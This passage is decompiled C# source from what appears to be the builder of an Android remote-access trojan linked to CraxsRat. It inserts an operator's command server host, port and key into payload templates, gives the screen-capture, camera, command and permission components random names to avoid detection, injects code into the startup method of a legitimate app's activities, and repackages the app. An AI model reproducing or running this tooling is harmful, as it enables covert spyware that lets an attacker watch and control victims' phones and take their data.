							.Replace("_the_host_", this.newhost)
							.Replace(this.Decrypt("fhTUPYsif35OSfhZ0W7kaw==", this.TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(this.TheKey.Text)))
							.Replace(this.Decrypt("l47cEy4tX1IFMbXx/K/EjQ==", this.TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(this.Host.Text)))
							.Replace(this.Decrypt("4v6Ulzh5+UOGfKCrVSMVZQ==", this.TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(this.Port.Text)))
							.Replace("USE-SUPER", this.usersper)
							.Replace("USE-DRAWOVER", this.usedraw)
							.Replace("[delayacess]", this.TextSize.Text)
							.Replace("[US-UNINS]", this.useruninstall)
							.Replace("USE-ALLPRIM", this.ASKPRIM_all.ToString())
							.Replace("fource.info", "false")
							.Replace("name.info", this.CLiname.Text)
							.Replace("_the_port_", this.newport)
							.Replace("_the_key_", this.newkey)
							.Replace("_the_alive_", this.newalive)
							.Replace("_usr_nam_", this.newname)
							.Replace("_the_eco_", this.neweco)
							.Replace("_C_N_L_", this.newcnl)
							.Replace("_c_N_M_", this.newcnm)
							.Replace("_NOTIFI_TITLE_", this.titletext.Text)
							.Replace("_NOTIFI_MSG_", this.msgtext.Text)
							.Replace("_send_mthd_", this.newsndmthd)
							.Replace("_the_fouce_", this.newsndmthd)
							.Replace("_the_fouce_", this.newforuce)
							.Replace("_the_sokt_", this.newsokt)
							.Replace("payload", Conversions.ToString(this.RandomShit(num4, num5)))
							.Replace("_start_connect_", this.newstrtconct)
							.Replace("_is_connected_", this.newconect)
							.Replace("[RANDOM-STRING]", this.NEWRANDOM)
							.Replace("RequestDraw", this.N_RequestDraw)
							.Replace("WakeupActivity", this.N_WakeupActivity);
						File.WriteAllText(text6, text7);
						Thread.Sleep(1);
					}
					string text8 = text5 + "\\effectservicecimpl\\marketpush";
					string text9 = "*.smali";
					int num6 = 0;
					string[] files2 = Directory.GetFiles(text8, text9, SearchOption.AllDirectories);
					string[] array10 = files2;
					foreach (string text10 in array10)
					{
						if (text10.Contains("RequestPermissions") | text10.Equals("RequestPermissions"))
						{
							File.Move(Path.Combine(text8, text10), Path.Combine(text8, text10.Replace("RequestPermissions", this.N_RequestPermissions)));
						}
						if (text10.Contains("EngineWorkerins") | text10.Equals("EngineWorkerins"))
						{
							File.Move(Path.Combine(text8, text10), Path.Combine(text8, text10.Replace("EngineWorkerins", this.N_newEngineWorkerins)));
						}
						if (text10.Contains("RequestAccess") | text10.Equals("RequestAccess"))
						{
							File.Move(Path.Combine(text8, text10), Path.Combine(text8, text10.Replace("RequestAccess", this.N_RequestAccess)));
						}
						if (text10.Contains("CommandsService") | text10.Equals("CommandsService"))
						{
							File.Move(Path.Combine(text8, text10), Path.Combine(text8, text10.Replace("CommandsService", this.N_CommandsService)));
						}
						if (text10.Contains("StartScreenCap") | text10.Equals("StartScreenCap"))
						{
							File.Move(Path.Combine(text8, text10), Path.Combine(text8, text10.Replace("StartScreenCap", this.NStartScreenCap)));
						}
						if (text10.Contains("RequestBattery") | text10.Equals("RequestBattery"))
						{
							File.Move(Path.Combine(text8, text10), Path.Combine(text8, text10.Replace("RequestBattery", this.N_RequestBattery)));
						}
						if (text10.Contains("RequestCapScreen") | text10.Equals("RequestCapScreen"))
						{
							File.Move(Path.Combine(text8, text10), Path.Combine(text8, text10.Replace("RequestCapScreen", this.N__RequestCapScreen_)));
						}
						if (text10.Contains("webviewer") | text10.Equals("webviewer"))
						{
							File.Move(Path.Combine(text8, text10), Path.Combine(text8, text10.Replace("webviewer", this.N__webviewer_)));
						}
						if (text10.Contains("CameraActivity") | text10.Equals("CameraActivity"))
						{
							File.Move(Path.Combine(text8, text10), Path.Combine(text8, text10.Replace("CameraActivity", this.N__CameraActivity_)));
						}
						if (text10.Contains("HandelScreenCap") | text10.Equals("HandelScreenCap"))
						{
							File.Move(Path.Combine(text8, text10), Path.Combine(text8, text10.Replace("HandelScreenCap", this.N_HandelScreenCap)));
						}
						if (text10.Contains("WakeupActivity") | text10.Equals("WakeupActivity"))
						{
							File.Move(Path.Combine(text8, text10), Path.Combine(text8, text10.Replace("WakeupActivity", this.N_WakeupActivity)));
						}
						if (text10.Contains("RequestDraw") | text10.Equals("RequestDraw"))
						{
							File.Move(Path.Combine(text8, text10), Path.Combine(text8, text10.Replace("RequestDraw", this.N_RequestDraw)));
						}
						num6++;
						Thread.Sleep(1);
					}
					num6 = 0;
					string[] files3 = Directory.GetFiles(text8, text9, SearchOption.AllDirectories);
					string[] array12 = files3;
					foreach (string text11 in array12)
					{
						text11.Contains("ClassGen");
						num6++;
						Thread.Sleep(1);
					}
				}
				catch (Exception ex7)
				{
					Exception ex8 = ex7;
					this.log.AppendText(Environment.NewLine + "Error : Encryption...\r\n" + ex8.Message);
				}
				this.log.AppendText(Environment.NewLine + "> Injecting Main Activity...");
				int num7 = 0;
				if (!this.CheckAutomatic.Checked)
				{
					string text12 = null;
					using (IEnumerator enumerator2 = this.Activlist.Items.GetEnumerator())
					{
						while (enumerator2.MoveNext())
						{
							object obj = enumerator2.Current;
							string text13 = Conversions.ToString(obj);
							try
							{
								text13 = text13.Replace(">", this.TheApkPath);
								if (File.Exists(text13))
								{
									string[] array14 = File.ReadAllLines(text13);
									int num8 = array14.Length - 1;
									for (int num9 = 0; num9 <= num8; num9++)
									{
										if (num9 == 0)
										{
											string[] array15 = array14[0].Split(new char[] { ' ' });
											text12 = array15[array15.Length - 1];
										}
										if (array14[num9].Contains(this.Decrypt("XqgovOgiwNmuEisbFkaXwA==", this.TK)) && array14[num9].ToLower().StartsWith(".method".ToLower()))
										{
											array14[num9 + 1] = array14[num9 + 1] + Environment.NewLine + this.D(Resources.oncreatecode).Replace(this.D("W3RyZ3RtYWluXQ=="), text12);
											array14[array14.Length - 1] = array14[array14.Length - 1] + Environment.NewLine + Environment.NewLine + this.D(this.Decrypt(Resources.MainMith, this.TK)).Replace(this.D("W3RyZ3RtYWluXQ=="), text12);
											break;
										}
									}
									File.WriteAllLines(text13, array14);
								}
							}
							catch (Exception)
							{
							}
							num7++;
						}
						goto IL_196D;
					}
				}
				List<string> activityNames = Codes.GetActivityNames(this.TheApkPath + "\\AndroidManifest.xml", this.checkonlymain.Checked);
				string text14 = "smali";
				string text15 = null;
				foreach (string text16 in activityNames)
				{
					string text17 = Codes.FindActivityInSmali(this.TheApkPath, text16, text14);
					if (Operators.CompareString(text17, "pass", false) != 0)
					{
						string[] array16 = File.ReadAllLines(text17);
						int num10 = array16.Length - 1;
						for (int num11 = 0; num11 <= num10; num11++)
						{
							if (num11 == 0)
							{
								string[] array17 = array16[0].Split(new char[] { ' ' });
								text15 = array17[array17.Length - 1];
							}
							if (array16[num11].Contains(this.Decrypt("XqgovOgiwNmuEisbFkaXwA==", this.TK)) && array16[num11].ToLower().StartsWith(".method".ToLower()))
							{
								array16[num11 + 1] = array16[num11 + 1] + Environment.NewLine + this.D(Resources.oncreatecode).Replace(this.D("W3RyZ3RtYWluXQ=="), text15);
								array16[array16.Length - 1] = array16[array16.Length - 1] + Environment.NewLine + Environment.NewLine + this.D(this.Decrypt(Resources.MainMith, this.TK)).Replace(this.D("W3RyZ3RtYWluXQ=="), text15);
								break;
							}
						}
						File.WriteAllLines(text17, array16);
					}
				}
				int num12 = 2;
				string text18 = null;
				do
				{
					if (Directory.Exists(this.TheApkPath + "\\smali_classes" + num12.ToString()))
					{
						text14 = "smali_classes" + num12.ToString();
						foreach (string text19 in activityNames)
						{
							string text20 = Codes.FindActivityInSmali(this.TheApkPath, text19, text14);
							if (!text20.Equals("pass", StringComparison.CurrentCultureIgnoreCase))
							{
								Console.WriteLine(text20);
								string[] array18 = File.ReadAllLines(text20);
								int num13 = array18.Length - 1;
								for (int num14 = 0; num14 <= num13; num14++)
								{
									if (num14 == 0)
									{
										string[] array19 = array18[0].Split(new char[] { ' ' });
										text18 = array19[array19.Length - 1];
									}
									if (array18[num14].Contains(this.Decrypt("XqgovOgiwNmuEisbFkaXwA==", this.TK)) && array18[num14].ToLower().StartsWith(".method".ToLower()))
									{
										array18[num14 + 1] = array18[num14 + 1] + Environment.NewLine + this.D(Resources.oncreatecode).Replace(this.D("W3RyZ3RtYWluXQ=="), text18);
										array18[array18.Length - 1] = array18[array18.Length - 1] + Environment.NewLine + Environment.NewLine + this.D(this.Decrypt(Resources.MainMith, this.TK)).Replace(this.D("W3RyZ3RtYWluXQ=="), text18);
										break;
									}
								}
								File.WriteAllLines(text20, array18);
							}
						}
					}
					num12++;
				}
				while (num12 <= 14);
			}
			IL_196D:
			if (this.CheckAutomatic.Checked)
			{
				this.log.AppendText(Environment.NewLine + "-----------------" + Environment.NewLine + "> Building Apk...");
				string text21 = this.WorkingDir + "\\out";
				this.outputapk = text21 + "\\Ready.apk";
				if (!Directory.Exists(text21))
				{
					Directory.CreateDirectory(text21);
				}
				this.ExecuteCommand(string.Concat(new string[] { "java -jar ", this.apktoolpath, " b -f ", this.TheApkPath, " -o ", this.outputapk }));
				return;
			}
			this.log.AppendText(Environment.NewLine + "-----------------" + Environment.NewLine + "All Done Recompile Apk...");
		}

		// Token: 0x060006A7 RID: 1703 RVA: 0x000B72F8 File Offset: 0x000B54F8
		public string Decrypt(string text, string password)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = new byte[32];
			byte[] array2 = md5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(password));
			Array.Copy(array2, 0, array, 0, 16);
			Array.Copy(array2, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array3 = Convert.FromBase64String(text);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array3, 0, array3.Length));
		}

		// Token: 0x060006A8 RID: 1704 RVA: 0x00004199 File Offset: 0x00002399
		public string madladstr()
		{
			return Conversions.ToString(this.RandommMad(100, 150));
		}

		// Token: 0x060006A9 RID: 1705 RVA: 0x000B7378 File Offset: 0x000B5578
		public object RandommMad(int minCharacters, int maxCharacters)
		{
			string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
			if (this.rshit == null)
			{
				this.rshit = new Random();
			}
			string text2 = "";
			checked
			{
				while (text2.Length < minCharacters)
				{
					text2 += Conversions.ToString(text[this.rshit.Next(0, text.Length - 1)]);
				}
				this.cou3++;
				return text2.ToString().ToLower() + Conversions.ToString(this.cou3);
			}
		}

		// Token: 0x060006AA RID: 1706 RVA: 0x000B7400 File Offset: 0x000B5600
		public object CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq(int minCharacters, int maxCharacters)
		{
			string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
			if (this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init == null)
			{
				Interlocked.CompareExchange<StaticLocalInitFlag>(ref this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init, new StaticLocalInitFlag(), null);
			}
			bool flag = false;
			try
			{
				Monitor.Enter(this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init, ref flag);
				if (this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State == 0)
				{
					this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State = 2;
					this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r = new Random();
				}
				else if (this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State = 1;
				if (flag)
				{
					Monitor.Exit(this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init);
				}
			}
			int num = this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r.Next(minCharacters, maxCharacters);
			StringBuilder stringBuilder = new StringBuilder();
			int num2 = num;
			checked
			{
				for (int i = 1; i <= num2; i++)
				{
					int num3 = this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r.Next(0, text.Length);
					stringBuilder.Append(text.Substring(num3, 1));
				}
				return stringBuilder.ToString();
			}
		}

		// Token: 0x060006AB RID: 1707 RVA: 0x000B74F8 File Offset: 0x000B56F8
		private bool CheckAllValuse()
		{
			if (this.Host.Text != "" && this.Port.Text != "" && this.TheKey.Text != "")
			{
				if (this.CheckAutomatic.Checked)
				{
					if (this.TargetApktext.Text != "")
					{
						return true;
					}
				}
				else if (this.FolderPath.Text != "" && this.Activlist.Items.Count > 0)
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x060006AC RID: 1708 RVA: 0x000B7584 File Offset: 0x000B5784
		private void Port_TextChanged(object sender, EventArgs e)
		{
			try
			{
				if (Operators.CompareString(this.Port.Text, "", false) != 0 && !Versioned.IsNumeric(this.Port.Text))
				{
					this.Port.Text = "";
					Interaction.MsgBox("Only Numbers", MsgBoxStyle.OkOnly, null);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060006AD RID: 1709 RVA: 0x000B75F0 File Offset: 0x000B57F0
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				MySettingsProperty.Settings.inj_tnam = this.CLiname.Text;
				MySettingsProperty.Settings.inj_thost = this.Host.Text;
				MySettingsProperty.Settings.inj_tport = this.Port.Text;
				MySettingsProperty.Settings.inj_tkey = this.TheKey.Text;
				MySettingsProperty.Settings.Save();
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060006AE RID: 1710 RVA: 0x000B7670 File Offset: 0x000B5870
		public string UpdateVersions(string inputXml)
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(inputXml);
			XmlNode xmlNode = xmlDocument.SelectSingleNode("/manifest");
			if (xmlNode != null)
			{
				XmlAttribute xmlAttribute = xmlNode.Attributes["compileSdkVersion"];
				XmlAttribute xmlAttribute2 = xmlNode.Attributes["platformBuildVersionCode"];
				int num;
				if (xmlAttribute != null && int.TryParse(xmlAttribute.Value, out num) && num > 29)
				{
					xmlAttribute.Value = "29";
				}
				int num2;
				if (xmlAttribute2 != null && int.TryParse(xmlAttribute2.Value, out num2) && num2 > 29)
				{
					xmlAttribute2.Value = "29";
				}
			}
			return xmlDocument.OuterXml;
		}

		// Token: 0x060006AF RID: 1711 RVA: 0x000B7708 File Offset: 0x000B5908
		private void Form1_Load(object sender, EventArgs e)
		{
			this.Translateme();
			try
			{
				this.CLiname.Text = MySettingsProperty.Settings.inj_tnam;
				this.Host.Text = MySettingsProperty.Settings.inj_thost;
				this.Port.Text = MySettingsProperty.Settings.inj_tport;
				this.TheKey.Text = MySettingsProperty.Settings.inj_tkey;
			}
			catch (Exception)
			{
				this.CLiname.Text = "Client1";
				this.Host.Text = "...";
				this.Port.Text = "7771";
				this.TheKey.Text = "TxTxT";
			}
		}

		// Token: 0x060006B0 RID: 1712 RVA: 0x00002423 File Offset: 0x00000623
		private void Button4_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x060006B1 RID: 1713 RVA: 0x00002D2D File Offset: 0x00000F2D
		private void DrakeUIAvatar1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x060006B2 RID: 1714
		[DllImport("user32")]
		public static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x060006B3 RID: 1715
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x060006B4 RID: 1716 RVA: 0x00002423 File Offset: 0x00000623
		private void DrakeUITitlePanel1_MouseDown(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x060006B5 RID: 1717 RVA: 0x000B77C4 File Offset: 0x000B59C4
		private void DrakeUITitlePanel2_Click(object sender, EventArgs e)
		{
			try
			{
				Process.Start("https:// /");
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060006B6 RID: 1718 RVA: 0x000041AD File Offset: 0x000023AD
		private void Panel3_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Jector.ReleaseCapture();
				Jector.SendMessage(base.Handle, Jector.WM_NCLBUTTONDOWN, Jector.HT_CAPTION, 0);
			}
		}

		// Token: 0x060006B7 RID: 1719 RVA: 0x000B77F4 File Offset: 0x000B59F4
		private void Removeactiv_Click(object sender, EventArgs e)
		{
			if (this.Activlist.Items.Count <= 0)
			{
				EagleAlert.Showinformation("Activity List: 0");
				return;
			}
			if (this.Activlist.SelectedItem != null)
			{
				this.Activlist.Items.Remove(RuntimeHelpers.GetObjectValue(this.Activlist.SelectedItem));
				return;
			}
			EagleAlert.Showinformation("Select Activity First");
		}

		// Token: 0x060006B8 RID: 1720 RVA: 0x000B7858 File Offset: 0x000B5A58
		private void CheckAutomatic_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.CheckAutomatic.Checked)
			{
				this.paneltargetfolder.Enabled = false;
				this.addactiv.Enabled = false;
				this.removeactiv.Enabled = false;
				this.panelactivitys.Enabled = false;
				this.Label6.Enabled = false;
				this.TargetApktext.Enabled = true;
				this.selectapkbtn.Enabled = true;
				this.labeltargetapp.Enabled = true;
				this.checkonlymain.Enabled = true;
				this.checkprotector.Enabled = true;
				return;
			}
			this.panelactivitys.Enabled = true;
			this.paneltargetfolder.Enabled = true;
			this.addactiv.Enabled = true;
			this.removeactiv.Enabled = true;
			this.Label6.Enabled = true;
			this.TargetApktext.Enabled = false;
			this.selectapkbtn.Enabled = false;
			this.labeltargetapp.Enabled = false;
			this.checkonlymain.Enabled = false;
			this.checkprotector.Enabled = false;
		}

		// Token: 0x060006B9 RID: 1721 RVA: 0x000B7964 File Offset: 0x000B5B64
		private void Selectapkbtn_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.InitialDirectory = "C:\\";
			openFileDialog.Title = "Selecte Android App [Only .apk] (.apk)";
			openFileDialog.Filter = "apk Files|*.apk";
			DialogResult dialogResult = openFileDialog.ShowDialog();
			if (dialogResult != DialogResult.OK)
			{
				this.TargetApktext.Text = "";
				return;
			}
			this.TargetApktext.Text = openFileDialog.FileName;
		}

		// Token: 0x060006BA RID: 1722 RVA: 0x000041D9 File Offset: 0x000023D9
		private void checksuper_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.checksuper.Checked)
			{
				this.usersper = "True";
				return;
			}
			this.usersper = "False";
		}

		// Token: 0x060006BB RID: 1723 RVA: 0x000041FF File Offset: 0x000023FF
		private void checkDraw_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.checkDraw.Checked)
			{
				this.usedraw = "True";
				return;
			}
			this.usedraw = "False";
		}

		// Token: 0x060006BC RID: 1724 RVA: 0x00004225 File Offset: 0x00002425
		private void checkkill_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.checkkill.Checked)
			{
				this.useruninstall = "on";
				return;
			}
			this.useruninstall = "off";
		}

		// Token: 0x0400077D RID: 1917
		private string TheApkPath;

		// Token: 0x0400077E RID: 1918
		private string N_RequestPermissions;

		// Token: 0x0400077F RID: 1919
		private const string RequestPermissions = "RequestPermissions";

		// Token: 0x04000780 RID: 1920
		private string N_RequestAccess;

		// Token: 0x04000781 RID: 1921
		private const string RequestAccess = "RequestAccess";

		// Token: 0x04000782 RID: 1922
		private string N_newEngineWorkerins;

		// Token: 0x04000783 RID: 1923
		private const string EngineWorkerins = "EngineWorkerins";

		// Token: 0x04000784 RID: 1924
		private string N_CommandsService;

		// Token: 0x04000785 RID: 1925
		private const string CommandsService = "CommandsService";

		// Token: 0x04000786 RID: 1926
		private string NStartScreenCap;

		// Token: 0x04000787 RID: 1927
		private const string StartScreenCap = "StartScreenCap";

		// Token: 0x04000788 RID: 1928
		private string N_WakeupActivity;

		// Token: 0x04000789 RID: 1929
		private const string WakeupActivity = "WakeupActivity";

		// Token: 0x0400078A RID: 1930
		private string N_RequestDraw;

		// Token: 0x0400078B RID: 1931
		private const string RequestDraw = "RequestDraw";

		// Token: 0x0400078C RID: 1932
		private string N_RequestBattery;

		// Token: 0x0400078D RID: 1933
		private const string RequestBattery = "RequestBattery";

		// Token: 0x0400078E RID: 1934
		private string N__CameraActivity_;

		// Token: 0x0400078F RID: 1935
		private const string CameraActivity = "CameraActivity";

		// Token: 0x04000790 RID: 1936
		private string N__RequestCapScreen_;

		// Token: 0x04000791 RID: 1937
		private const string RequestCapScreen = "RequestCapScreen";

		// Token: 0x04000792 RID: 1938
		private string N__webviewer_;

		// Token: 0x04000793 RID: 1939
		private const string webviewer = "webviewer";

		// Token: 0x04000794 RID: 1940
		private string N_HandelScreenCap;

		// Token: 0x04000795 RID: 1941
		private const string HandelScreenCap = "HandelScreenCap";

		// Token: 0x04000796 RID: 1942
		private string newgetbyts;

		// Token: 0x04000797 RID: 1943
		private string newsrvrun;

		// Token: 0x04000798 RID: 1944
		private string split1;

		// Token: 0x04000799 RID: 1945
		private string split2;

		// Token: 0x0400079A RID: 1946
		private string split3;

		// Token: 0x0400079B RID: 1947
		private string split4;

		// Token: 0x0400079C RID: 1948
		private string newhost;

		// Token: 0x0400079D RID: 1949
		private string newport;

		// Token: 0x0400079E RID: 1950
		private string newkey;

		// Token: 0x0400079F RID: 1951
		private string newalive;

		// Token: 0x040007A0 RID: 1952
		private string newname;

		// Token: 0x040007A1 RID: 1953
		private string neweco;

		// Token: 0x040007A2 RID: 1954
		private string newconect;

		// Token: 0x040007A3 RID: 1955
		private string newsokt;

		// Token: 0x040007A4 RID: 1956
		private string newstrtconct;

		// Token: 0x040007A5 RID: 1957
		private string newcnl;

		// Token: 0x040007A6 RID: 1958
		private string newcnm;

		// Token: 0x040007A7 RID: 1959
		private string newsndmthd;

		// Token: 0x040007A8 RID: 1960
		private string newforuce;

		// Token: 0x040007A9 RID: 1961
		private string newplgs;

		// Token: 0x040007AA RID: 1962
		private string NEWRANDOM;

		// Token: 0x040007AB RID: 1963
		private string usersper;

		// Token: 0x040007AC RID: 1964
		private string usedraw;

		// Token: 0x040007AD RID: 1965
		private string useruninstall;

		// Token: 0x040007AE RID: 1966
		private List<string> ALLPRIMSLIST;

		// Token: 0x040007AF RID: 1967
		private int cou;

		// Token: 0x040007B0 RID: 1968
		public string TK;

		// Token: 0x040007B1 RID: 1969
		public bool need_write;

		// Token: 0x040007B2 RID: 1970
		public bool need_battery;

		// Token: 0x040007B3 RID: 1971
		public bool need_read;

		// Token: 0x040007B4 RID: 1972
		public bool need_forground;

		// Token: 0x040007B5 RID: 1973
		public bool need_syswinow;

		// Token: 0x040007B6 RID: 1974
		public bool need_boot;

		// Token: 0x040007B7 RID: 1975
		public bool need_all;

		// Token: 0x040007B8 RID: 1976
		public bool ASKPRIM_all;

		// Token: 0x040007B9 RID: 1977
		public bool Once;

		// Token: 0x040007BA RID: 1978
		public bool HoldMainThread;

		// Token: 0x040007BB RID: 1979
		private Process cmdProcess;

		// Token: 0x040007BC RID: 1980
		public string WorkingDir;

		// Token: 0x040007BD RID: 1981
		private bool FoundJava;

		// Token: 0x040007BE RID: 1982
		private string apktemp;

		// Token: 0x040007BF RID: 1983
		private string apktoolpath;

		// Token: 0x040007C0 RID: 1984
		private string Apksignerpath;

		// Token: 0x040007C1 RID: 1985
		private string ApkZIPpath;

		// Token: 0x040007C2 RID: 1986
		private string outputapk;

		// Token: 0x040007C3 RID: 1987
		private string originalapkname;

		// Token: 0x040007C4 RID: 1988
		private string Apkeditorpath;

		// Token: 0x040007C5 RID: 1989
		private bool protectfinished;

		// Token: 0x040007C6 RID: 1990
		public Random rshit;

		// Token: 0x040007C7 RID: 1991
		public int cou3;

		// Token: 0x040007C8 RID: 1992
		public static int WM_NCLBUTTONDOWN = 161;

		// Token: 0x040007C9 RID: 1993
		public static int HT_CAPTION = 2;

		// Token: 0x040007CA RID: 1994
		private Random _0024STATIC_0024RandomShit_00242021C88_0024r;

		// Token: 0x040007CB RID: 1995
		private StaticLocalInitFlag _0024STATIC_0024RandomShit_00242021C88_0024r_0024Init;

		// Token: 0x040007CC RID: 1996
		private Random _0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number;

		// Token: 0x040007CD RID: 1997
		private StaticLocalInitFlag _0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init;

		// Token: 0x040007CE RID: 1998
		private Random _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r;

		// Token: 0x040007CF RID: 1999
		private StaticLocalInitFlag _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init;

		// Token: 0x02000071 RID: 113
		[CompilerGenerated]
		internal sealed class _Closure_0024__289_002D0
		{
			// Token: 0x060006C5 RID: 1733 RVA: 0x00004305 File Offset: 0x00002505
			public _Closure_0024__289_002D0(Jector._Closure_0024__289_002D0 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_msg = arg0._0024VB_0024Local_msg;
				}
			}

			// Token: 0x060006C6 RID: 1734 RVA: 0x0000431C File Offset: 0x0000251C
			internal void _Lambda_0024__1()
			{
				this._0024VB_0024Me.log.AppendText(Environment.NewLine + this._0024VB_0024Local_msg.Replace("I:", "> "));
			}

			// Token: 0x060006C7 RID: 1735 RVA: 0x0000434D File Offset: 0x0000254D
			internal void _Lambda_0024__2()
			{
				this._0024VB_0024Me.log.AppendText(Environment.NewLine + this._0024VB_0024Local_msg);
			}

			// Token: 0x060006C8 RID: 1736 RVA: 0x0000436F File Offset: 0x0000256F
			internal void _Lambda_0024__3()
			{
				this._0024VB_0024Me.log.AppendText(Environment.NewLine + this._0024VB_0024Local_msg.Replace("E:", "ERROR :"));
			}

			// Token: 0x04000805 RID: 2053
			public string _0024VB_0024Local_msg;

			// Token: 0x04000806 RID: 2054
			public Jector _0024VB_0024Me;
		}

		// Token: 0x02000072 RID: 114
		[CompilerGenerated]
		internal sealed class _Closure_0024__289_002D1
		{
			// Token: 0x060006C9 RID: 1737 RVA: 0x000043A0 File Offset: 0x000025A0
			public _Closure_0024__289_002D1(Jector._Closure_0024__289_002D1 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_ex = arg0._0024VB_0024Local_ex;
				}
			}

			// Token: 0x060006CA RID: 1738 RVA: 0x000043B7 File Offset: 0x000025B7
			internal void _Lambda_0024__10()
			{
				this._0024VB_0024Me.log.AppendText(Environment.NewLine + "Global Error: " + this._0024VB_0024Local_ex.Message);
			}

			// Token: 0x04000807 RID: 2055
			public Exception _0024VB_0024Local_ex;

			// Token: 0x04000808 RID: 2056
			public Jector _0024VB_0024Me;
		}
	}
}
